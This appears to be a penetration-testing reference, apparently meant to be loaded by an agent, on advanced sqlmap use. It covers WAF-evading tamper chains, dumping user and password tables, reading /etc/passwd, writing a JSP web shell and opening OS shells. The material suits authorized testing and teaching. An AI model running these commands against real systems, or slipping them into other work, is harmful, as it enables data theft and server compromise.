# sqlmap Advanced Workflow & Tamper Recipes

Load this file when automating confirmed injection points with sqlmap, or when a WAF forces tamper-script chaining. Distilled from yaklang/hack-skills (`SQLMAP_ADVANCED.md`), PayloadsAllTheThings `SQLmap.md`, HackTricks SQLMap cheatsheet.

## 1. Core Command Shapes

```bash
# Basic detection (batch = non-interactive)
sqlmap -u "http://target.com/page?id=1" --batch

# Saved raw HTTP request (Burp: copy as raw) — best for auth'd/POST flows
sqlmap -r request.txt --batch --level=3 --risk=2

# POST body + cookies + explicit param selection
sqlmap -u "https://target/search" --data="q=test&page=1" --cookie="SESSION=abc" -p q --batch

# JSON body with injection marker (*)
sqlmap -u "https://api.target/items" --data='{"id":"1*"}' --content-type="application/json" --batch

# List only injectable params first (fast triage over many endpoints)
sqlmap -u "http://target/page?id=1&x=2" --batch --tables=false 2>&1 | grep -i param
```

## 2. Technique / Level / Risk Control

| Flag | Meaning |
|---|---|
| `-t BEUSTQ` | B=Boolean blind, E=Error, U=UNION, S=Stacked, T=Time, Q=Inline query |
| `--level 1–5` | 1 GET/POST; 2 +Cookie; 3 +User-Agent/Referer; 4 more payloads; 5 everything |
| `--risk 1–3` | 1 harmless; 2 adds heavy time-based; 3 adds OR-based (can alter data in UPDATE/DELETE sinks) |

```bash
sqlmap -u "$URL" --technique=UE            # fast, low noise when output is visible
sqlmap -u "$URL" --technique=BT --level=2 --risk=1   # stealthy blind recon
sqlmap -u "$URL" --technique=S --dbms=mssql          # stacked (MSSQL/PG only)
sqlmap -u "$URL" --data="email=x" --technique=BST --risk=3 --level=3  # UPDATE/DELETE sinks
```

## 3. Enumeration → Extraction Pipeline

```bash
sqlmap -u "$URL" --current-db --current-user --banner --is-dba   # fingerprint
sqlmap -u "$URL" --dbs                                          # all databases
sqlmap -u "$URL" -D appdb --tables                              # tables
sqlmap -u "$URL" -D appdb -T users --columns                    # columns
sqlmap -u "$URL" -D appdb -T users -C "username,password" --dump # targeted dump
sqlmap -u "$URL" -D appdb -T users --dump --start=1 --stop=20    # partial (minimize data touched)
sqlmap -u "$URL" --sql-query="SELECT version()"                  # ad-hoc statement
sqlmap -u "$URL" --dump-all --exclude-sysdatabases               # bulk (noisy; scope-permitting only)
```

Speed/quality flags: `--threads=8` (blind extraction), `--charset=0123456789abcdef` (hex hashes), `--string="No results"` / `--not-string` to anchor boolean diffs, `--timeout=30 --retries=3`, `--flush-session` to re-test, `-v 3` while debugging tampers.

## 4. Tamper Script Matrix

| Tamper | Effect | Use against |
|---|---|---|
| `space2comment` | `SELECT/**/user` | literal-space filters |
| `space2plus` / `space2query` | `+` / `?` as space | URL-encoded space filters |
| `space2hash` / `space2morehash` | `#%0a` padding | MySQL strict WAFs |
| `space2mssqlblank` | blank chars `%00–%0F` | MSSQL |
| `randomcase` | `SeLeCt` | case-sensitive signatures |
| `randomcomments` | `SEL/**/ECT` | keyword-signature WAFs |
| `between` | `>` → `NOT BETWEEN 0 AND` | comparison-operator blocks |
| `equaltolike` | `=` → `LIKE` | equals-sign blocks |
| `greatest` | `>` → `GREATEST(x,N)=x` | operator blocks |
| `symboliclogical` | `AND`→`&&`, `OR`→`\|\|` | keyword blocks |
| `charencode` / `chrunicodeencode` | URL/unicode encode | generic evasion |
| `chardoubleencode` | double URL-encode | proxy that decodes once before WAF |
| `versionedkeywords` / `modsecurityversioned` | `/*!50000SELECT*/` | ModSecurity CRS on MySQL |
| `unionalltounion` | drop `ALL` | rules keyed on `UNION ALL` |
| `percentage` | `S%E%L%E%C%T` | IIS/ASP classic filter |
| `apostrophemask` / `apostrophenullencode` | quote variants | quote filters |
| `base64encode` / `hexencode2` / `unhexify` | encoded payloads | custom decoders |
| `appendnullbyte` | trailing `%00` | null-byte truncation |
| `sp_password` | append `--sp_password` | hide payload in MSSQL logs |
| `bluecoat` | `%09` after keywords | Blue Coat ProxySG |

## 5. Tamper Chain Recipes

```bash
# MySQL behind ModSecurity CRS
sqlmap -u "$URL" --tamper=space2comment,between,randomcase,modsecurityversioned --batch

# MySQL behind Cloudflare
sqlmap -u "$URL" --tamper=space2comment,charencode,randomcase,between --batch

# MSSQL behind IIS + generic WAF
sqlmap -u "$URL" --tamper=space2mssqlblank,randomcase,charencode,sp_password --batch

# Oracle behind enterprise WAF
sqlmap -u "$URL" --tamper=between,randomcase,charencode --batch

# Double-proxy (front proxy decodes once)
sqlmap -u "$URL" --tamper=chardoubleencode,space2comment,randomcase --batch

# PostgreSQL behind strict keyword WAF
sqlmap -u "$URL" --tamper=space2comment,between,randomcase,symboliclogical --batch
```

Chain principle: start with ONE tamper and add only what the block reason demands — long chains raise latency and IDS noise. Verify manually which token trips the WAF first (see SKILL.md §8).

## 6. Second-Order Injection

```bash
sqlmap -u "https://target/register" --data="username=test*&password=pw" \
       --second-url="https://target/profile" --second-req=second_request.txt --batch
```

`--second-url` = page where the stored payload later executes.

## 7. File & OS Escalation (explicit authorization required)

```bash
sqlmap -u "$URL" --file-read="/etc/passwd"                 # DBMS file read primitive
sqlmap -u "$URL" --file-write=shell.jsp --file-dest=/var/www/html/s.jsp  # write (last resort)
sqlmap -u "$URL" --os-shell                                # xp_cmdshell / UDF / PL-Python path
sqlmap -u "$URL" --os-shell --dbms=mysql                  # force UDF vector
sqlmap -u "$URL" --os-pwn                                 # Meterpreter-style session
```

Prefer proof-of-concept reads (`/etc/passwd`, registry/version strings) over writes/shells; document privilege state instead of landing persistence unless tasked.

## 8. Useful Misc Flags

```bash
--dbms=mysql|mssql|oracle|pgsql|sqlite   # skip fingerprinting, cut noise/time
--identify-waf                           # fingerprint the filtering layer
--prefix="')" --suffix="-- -"            # custom context closure
--proxy=http://127.0.0.1:8080            # route through Burp for evidence capture
--skip-urlencode                         # raw-socket evasion experiments
--delay=1 --safe-freq=5                  # rate-limit against fragile/live systems
--tor --check-tor                        # engagement-network hygiene
--output-dir=./loot                      # evidence location (keep out of git)
```

## 9. Reading sqlmap Output Correctly

- Trust `Parameter: ... is vulnerable` lines plus the **Type/Payload** pair it prints — paste both into the report as reproducible evidence.
- False positives happen on cached pages or reflection quirks: re-run the printed payload manually with curl/Burp before classifying.
- `--level`/`tamper` changes can flip results; record the exact command line that succeeded so findings are reproducible.

## 10. Alternative Tooling (CEH Module 15 + BugHunter distillation)

**NoSQLMap** — MongoDB/CouchDB injection automation (pairs with `advanced-techniques.md` §16):

```bash
git clone https://github.com/codingo/NoSQLMap.git && cd NoSQLMap && python nosqlmap.py
python nosqlmap.py -t http://target.com/login -p username,password     # form targets
python nosqlmap.py -t http://target.com/api/login -p json --json       # JSON bodies
```

**jSQL Injection** — GUI multi-DBMS scanner with filesystem/shell modules: `java -jar jsql-injection-v0.82.jar`. Useful for slow manual verification when sqlmap is too noisy; same authorization rules apply.

**Quick scanners for triage only** (they flag candidates, not proof): `nikto -h http://target.com`, `zap-cli active-scan http://target.com`. Always re-verify manually per Gate 0 (`SKILL.md`).

**Burp Intruder payload set for column enumeration** (Cluster bomb on a NULL-list position):

```
§1§
§1§,§1§
§1§,§1§,§1§
§1§,§1§,§1§,§1§
...   -- extend to ~12; watch for the count where the error stops / extra rows appear
```

**curl one-liners:** time-based delta check (`-w "%{time_total}"` baseline vs `SLEEP(5)`, see `SKILL.md` §6); header injection probes (`-H "X-Forwarded-For: ...' AND SLEEP(5)--"`).

**Manual-testing checklist** (every endpoint): test all input parameters · test every injection context (query/body/header/cookie/path/second-order) · vary payload families (error → boolean → time) · check error messages for fingerprint · monitor response times and length deltas against the baseline.
